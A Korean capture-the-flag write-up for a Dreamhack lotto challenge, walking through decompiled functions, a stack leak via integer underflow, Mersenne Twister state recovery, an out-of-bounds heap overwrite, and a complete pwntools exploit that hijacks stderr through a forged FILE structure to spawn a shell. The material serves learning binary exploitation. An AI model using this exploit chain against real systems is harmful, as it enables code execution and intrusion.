보호기법
```bash
[*] '/home/csh/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

main 함수
```C
void __fastcall __noreturn main(const char *a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init();
  while ( 1 )
  {
    do
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d", &v3);
        if ( v3 != 4103 )
          break;
        login();
      }
    }
    while ( v3 > 4103 );
    if ( v3 == 3 )
    {
      write(1, "Bye", 3uLL);
      exit(0);
    }
    if ( v3 <= 3 )
    {
      if ( v3 == 1 )
      {
        lotto();
      }
      else if ( v3 == 2 )
      {
        show_winner();
      }
    }
  }
}
```

리버싱하면서 함수명들을 적절하게 변경하였다.

```C
__int64 init()
{
  unsigned int v0; // eax

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  s = malloc(0x9C1uLL);
  memset(s, 0, 0x9C1uLL);
  v0 = get_random();
  return set_twister(v0);
}

__int64 get_random()
{
  unsigned int v1; // [rsp+Ch] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+10h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  syscall(318LL, &v1, 4LL, 2LL, 0LL, 0LL, 0LL);
  return v1;
}

__int64 __fastcall set_twister(int a1)
{
  __int64 result; // rax
  int i; // [rsp+10h] [rbp-4h]

  *(_DWORD *)s = a1;
  for ( i = 1; i <= 623; ++i )
  {
    *((_DWORD *)s + i) = 1812433253 * (*((_DWORD *)s + i - 1) ^ (*((_DWORD *)s + i - 1) >> 30)) + i;
    *((_DWORD *)s + i) = *((_DWORD *)s + i);
  }
  result = (unsigned int)i;
  get_random_index = i;
  return result;
}
```

메르센 트위스터로 보인다. v0는 시드값이다.

```C
unsigned __int64 lotto()
{
  int v0; // ecx
  unsigned int v2; // [rsp+4h] [rbp-6Ch] BYREF
  int v3; // [rsp+8h] [rbp-68h]
  int i; // [rsp+Ch] [rbp-64h]
  int j; // [rsp+10h] [rbp-60h]
  int k; // [rsp+14h] [rbp-5Ch]
  int m; // [rsp+18h] [rbp-58h]
  int n; // [rsp+1Ch] [rbp-54h]
  int v9[8]; // [rsp+20h] [rbp-50h] BYREF
  int v10[7]; // [rsp+40h] [rbp-30h] BYREF
  char v11[2]; // [rsp+5Fh] [rbp-11h] BYREF
  char s[7]; // [rsp+61h] [rbp-Fh] BYREF
  unsigned __int64 v13; // [rsp+68h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  v3 = 0;
  memset(s, 0, sizeof(s));
  memset(v10, 0, 7uLL);
  memset(v9, 0, 7uLL);
  write(1, "win probability is 1/8140000....\n", 0x21uLL);
  for ( i = 0; i <= 5; ++i )
  {
    write(1, "> ", 2uLL);
    __isoc99_scanf("%hhu", &s[i]);
  }
  for ( j = 0; j <= 5; ++j )
    v10[j] = get_register_random();
  for ( k = 0; k <= 5; ++k )
  {
    v0 = (1813430637 * (unsigned __int64)(unsigned int)v10[k]) >> 32;
    v9[k] = v10[k] - 45 * ((v0 + ((unsigned int)(v10[k] - v0) >> 1)) >> 5) + 1;
  }
  for ( m = 0; m <= 5; ++m )
  {
    if ( v9[m] == (unsigned __int8)s[m] )
      ++v3;
  }
  if ( v3 == 6 )
  {
    write(1, "** Win!!! **\n", 0xDuLL);
    write(1, "Save your information\n", 0x16uLL);
    make_name();
  }
  else
  {
    write(1, "!! Failed !!\n", 0xDuLL);
    write(1, "Do you want to see what value of lotto?\n> ", 0x2AuLL);
    __isoc99_scanf(" %c", v11);
    if ( v11[0] == 121 )
    {
      write(1, "how much do you want?\n> ", 0x18uLL);
      __isoc99_scanf("%d", &v2);
      if ( v2 < 7 )
      {
        write(1, "Lotto Numbers : [", 0x11uLL);
        for ( n = 0; n <= (unsigned __int8)(v2 - 1); ++n )
        {
          if ( n == v2 - 1 )
            printf("%u", (unsigned int)v9[n]);
          else
            printf("%u, ", (unsigned int)v9[n]);
        }
        write(1, "]\n", 2uLL);
      }
      else
      {
        write(1, "No!!\n", 5uLL);
      }
    }
  }
  return v13 - __readfsqword(0x28u);
}
```

```C
v0 = (1813430637 * (unsigned __int64)(unsigned int)v10[k]) >> 32;
v9[k] = v10[k] - 45 * ((v0 + ((unsigned int)(v10[k] - v0) >> 1)) >> 5) + 1;
```
이 연산은 (v10\[k\] % 45) + 1 이다.
v11에 0을 입력하면 조건문은 통과하지만 (unsigned \_\_int8)(v2 - 1) 에서 integer underflow가 발생해 스택의 많은 값들이 출력된다. 아쉽게도 시드값은 다른 값에 의해 덮어씌워졌지만, v10 배열에 저장되어있는 랜덤 값은 가져올 수 있다. `set_twister`와 `get_register_random()`에서 이 랜덤 함수가 파이썬의 랜덤 함수와 굉장히 유사함을 유추할 수 있고, randcrack 라이브러리와 출력되는 랜덤 값을 이용해서(한 번에 6개, 104번 반복) 랜덤 함수를 복구해낸다. (매우 높은 확률로 성공하는 것을 보니 랜덤 구현이 파이썬과 완전히 같은 것 같다.)

```C
unsigned __int64 make_name()
{
  int v0; // ebx
  void **v1; // rbx
  __int64 v2; // rbx
  unsigned int v4; // [rsp+4h] [rbp-1Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  if ( (unsigned __int8)win_num <= 0x10u )
  {
    v0 = (unsigned __int8)win_num;
    *((_QWORD *)&name_address + v0) = malloc(0x18uLL);
    memset(*((void **)&name_address + (unsigned __int8)win_num), 0, 0x18uLL);
    write(1, "name size > ", 0xCuLL);
    __isoc99_scanf("%u", &v4);
    if ( v4 <= 0xFFF && v4 )
    {
      name_size[(unsigned __int8)win_num] = v4;
      v1 = (void **)*((_QWORD *)&name_address + (unsigned __int8)win_num);
      *v1 = malloc((unsigned int)name_size[(unsigned __int8)win_num]);
      memset(
        **((void ***)&name_address + (unsigned __int8)win_num),
        0,
        (unsigned int)name_size[(unsigned __int8)win_num]);
      v2 = *((_QWORD *)&name_address + (unsigned __int8)win_num);
      *(_QWORD *)(v2 + 8) = malloc(0x10uLL);
      memset(*(void **)(*((_QWORD *)&name_address + (unsigned __int8)win_num) + 8LL), 0, 0x10uLL);
      write(1, "name > ", 7uLL);
      read(
        0,
        **((void ***)&name_address + (unsigned __int8)win_num),
        (unsigned int)(name_size[(unsigned __int8)win_num] - 1));
      write(1, "description > ", 0xEuLL);
      read(0, *(void **)(*((_QWORD *)&name_address + (unsigned __int8)win_num) + 8LL), 0xFuLL);
      ++win_num;
      write(1, "Done!", 6uLL);
    }
    else
    {
      write(1, "Invalid size", 0xCuLL);
    }
  }
  else
  {
    win_num = 0;
  }
  return v5 - __readfsqword(0x28u);
}
```
청크 안에 다른 힙 주소가 있고, 이를 참조한다. 이름 크기는 따로 배열에 저장한다. 배열 저장이 0~0x10 까지 되는데, 배열 크기가 16으로 설정되어있으므로 name_size\[0\]을 매우 큰 수로 바꿀 수 있다.

```C
unsigned __int64 login()
{
  char s[16]; // [rsp+0h] [rbp-30h] BYREF
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(s, 0, sizeof(s));
  memset(buf, 0, 0x10uLL);
  write(1, "ID > ", 5uLL);
  read(0, s, 0x10uLL);
  write(1, "PW > ", 5uLL);
  read(0, buf, 0x10uLL);
  printf("Your ID : %s\n", s);
  printf("Your PW : %s\n", buf);
  if ( check_id((__int64)s) && check_pw(buf) )
  {
    write(1, "** Login Success! **\n", 0x15uLL);
    sub_1A4A();
  }
  else
  {
    write(1, "!! Failed Login !!\n", 0x13uLL);
  }
  return v3 - __readfsqword(0x28u);
}
```
랜덤 함수를 복구해냈으므로 쉽게 통과 가능하다.

```C
unsigned __int64 edit_name()
{
  unsigned __int8 v1; // [rsp+7h] [rbp-9h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  write(1, "edit user slot idx > ", 0x15uLL);
  __isoc99_scanf("%hhu", &v1);
  if ( v1 <= 0xFu )
  {
    if ( *((_QWORD *)&name_address + v1) )
    {
      write(1, "name > ", 7uLL);
      read(0, **((void ***)&name_address + v1), (unsigned int)(name_size[v1] - 1));
      write(1, "description > ", 0xEuLL);
      read(0, *(void **)(*((_QWORD *)&name_address + v1) + 8LL), 0xFuLL);
      write(1, "Done!", 5uLL);
    }
    else
    {
      write(1, "user not exist\n", 0xFuLL);
    }
  }
  return v2 - __readfsqword(0x28u);
}
```
청크를 재구성할 수 있는데, name_size\[0\]을 굉장히 크게 해놓았기 때문에 다른 청크까지 변화시킬 수 있다. 청크 내의 주소를 참조하므로, 그 것을 stderr 주소로 변조시켜 FSOP 한다.

(stdout FSOP는 안 되는데 stderr FSOP는 된다. 아직 FSOP를 이해하지 못해서 이유를 모르겠다.)

```python
from pwn import *
from randcrack import RandCrack
from tqdm import *

p = remote('host3.dreamhack.games', 15089)
#p = process('./main')

l = ELF('./libc.so.6')
rc = RandCrack()

def lotto(win_num : list, name_size = 0, name = b'', description = b''):
    p.sendlineafter(b'> ', b'1')
    for num in win_num:
        p.sendlineafter(b'> ', str(num).encode())

    msg = p.recvline()
    if b'!! Failed !!' in msg:
        p.sendlineafter(b'> ', b'y')
        p.sendlineafter(b'> ', b'0')
        ln = ''.join(p.recvline().decode().split('[')[1].split(']')[0].split(',')).strip().split(' ')
        ln = list(map(int, ln))
        return ln
    else :
        p.sendlineafter(b'name size > ', str(name_size).encode())
        p.sendafter(b'name > ', name)
        p.sendafter(b'description > ', description)

for k in tqdm(range(104)):
    l2 = lotto([1 for _ in range(6)])
    for i in range(8, 14):
        rc.submit(l2[i])

def login(idx : int, name : bytes, description : bytes):
    id = 'admin' + format(rc.predict_randrange(0, 4294967295), 'X')
    pw = format(rc.predict_randrange(0, 4294967295), 'X')
    p.sendlineafter(b'> ', b'4103')
    p.sendafter(b'ID > ', id.encode())
    p.sendafter(b'PW > ', pw.encode())
    p.sendlineafter(b'edit user slot idx > ', str(idx).encode())
    p.sendafter(b'name > ', name)
    p.sendafter(b'description > ', description)

l1 = lotto([1 for _ in range(6)])
pie_base = l1[6] + (l1[7] << 32) - (0x555555555719 - 0x555555554000)
l.address = l1[30] + (l1[31] << 32) - (0x7ffff7977d90 - 0x7ffff794e000)
print(hex(pie_base))
print(hex(l.address))

for _ in range(6):
    rc.predict_randrange(0, 4294967295) % 45

lotto([(rc.predict_randrange(0, 4294967295) % 45) + 1 for _ in range(6)], 4, b'1', b'1')
lotto([(rc.predict_randrange(0, 4294967295) % 45) + 1 for _ in range(6)], 900, b'1', b'1')

for i in tqdm(range(2, 17)):
    lotto([(rc.predict_randrange(0, 4294967295) % 45) + 1 for _ in range(6)], 4, str(i).encode(), b'1')

login(0, b'a' * 0x18 + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(l.sym['_IO_2_1_stderr_']), b'b')

fake_fsop_struct = l.sym['_IO_2_1_stderr_']
def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=fake_fsop_struct + 0x1000,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x40,
    _mode=0xFFFFFFFF,
)

login(1, FSOP, b'b')

p.interactive()
```